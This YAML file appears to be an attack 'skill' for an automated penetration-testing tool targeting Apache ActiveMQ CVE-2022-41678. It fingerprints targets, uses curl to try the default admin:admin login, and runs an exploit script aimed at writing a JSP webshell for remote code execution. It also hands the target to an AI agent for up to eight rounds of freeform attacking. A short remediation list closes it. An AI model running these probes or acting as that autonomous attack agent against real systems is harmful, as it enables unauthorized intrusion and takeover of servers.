# ═══════════════════════════════════════════════════════════
# Apache ActiveMQ CVE-2022-41678 — Jolokia JMX RCE  v4
#
# v4 修复:
#   - ENDPOINT 去路径取 base URL，避免 /admin//admin/ 拼接错误
#   - 探测同时试 ENDPOINT 原始端口和 8161
#   - exploit_script 传入正确的 base URL
# ═══════════════════════════════════════════════════════════
skill_id: activemq_rce
name: "ActiveMQ Jolokia JMX RCE (CVE-2022-41678)"
category: web_rce
version: "4.0"

principle: |
  Apache ActiveMQ Web Console（默认 8161 端口）内嵌 Jolokia 代理。
  使用默认凭据 admin:admin 后，可通过 Log4j2 MBean / JFR MBean /
  fileserver PUT 三种方式写入 JSP Webshell 实现 RCE。
  
  关键: Jolokia API 需要 Origin: http://localhost 头绕过 CORS。

match:
  rules:
    - fingerprint_contains: ["activemq"]
    - fingerprint_contains: ["ActiveMQ"]
    - evidence_contains: ["activemq"]
    - evidence_contains: ["ActiveMQ"]
    - evidence_contains: ["jolokia"]
    - evidence_contains: ["8161"]
    - cve_matches: ["CVE-2022-41678"]
    - cve_matches: ["CVE-2016-3088"]

probes:
  - id: find_admin
    description: "发现 ActiveMQ 管理口并测试凭据"
    steps:
      - command: |
          # 从 ENDPOINT 提取 base URL（去掉路径部分，只保留 scheme://host:port）
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "BASE_URL: $BASE"

          # 试 base URL 的 /admin/（抓 body，ActiveMQ 标识在 HTML 里）
          resp=$(curl -s -u admin:admin "$BASE/admin/" --max-time 8 2>/dev/null)
          if echo "$resp" | grep -qi "ActiveMQ"; then
            echo "ACTIVEMQ_CONFIRMED"
            echo "ADMIN_BASE:$BASE"
          fi

          # 如果 base URL 不是 8161，额外试 8161
          if ! echo "$BASE" | grep -q ":8161"; then
            resp2=$(curl -s -u admin:admin "http://{TARGET_IP}:8161/admin/" --max-time 8 2>/dev/null)
            if echo "$resp2" | grep -qi "ActiveMQ"; then
              echo "ACTIVEMQ_CONFIRMED"
              echo "ADMIN_BASE:http://{TARGET_IP}:8161"
            fi
          fi
        parse_rules:
          - if_contains: ["ACTIVEMQ_CONFIRMED"]
            set: { activemq_confirmed: true }

exploit_paths:
  - path_id: exploit_script
    name: "activemq_exploit.py 一键利用"
    priority: 1
    conditions:
      activemq_confirmed: true
    steps:
      - id: run_exploit
        description: "activemq_exploit.py 自动利用（Log4j2 / JFR / fileserver）"
        command: |
          # 从 ENDPOINT 提取 base URL
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')

          # 确定管理口端口
          code=$(curl -s -o /dev/null -w "%{http_code}" -u admin:admin "$BASE/admin/" --max-time 5 2>/dev/null)
          if [ "$code" != "200" ]; then
            # 试 8161
            code2=$(curl -s -o /dev/null -w "%{http_code}" -u admin:admin "http://{TARGET_IP}:8161/admin/" --max-time 5 2>/dev/null)
            if [ "$code2" = "200" ]; then
              BASE="http://{TARGET_IP}:8161"
            fi
          fi
          echo "[*] 使用 BASE URL: $BASE"
          python3 /opt/activemq_exploit.py "$BASE" 2>&1
        timeout: 180
        success_criteria:
          stdout_contains_any: ["ACTIVEMQ_RCE_SUCCESS", "uid="]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_activemq_script"

  - path_id: llm_freeform
    name: "LLM 自由推理（限定 ActiveMQ 范围）"
    priority: 99
    mode: react_freeform
    max_rounds: 8
    conditions:
      activemq_confirmed: true

remediation: |
  1. 升级 Apache ActiveMQ 至 5.16.5 / 5.17.3 或更高版本
  2. 修改默认凭据 admin:admin
  3. 限制 /api/jolokia/ 和 /fileserver/ 访问
  4. 禁用 fileserver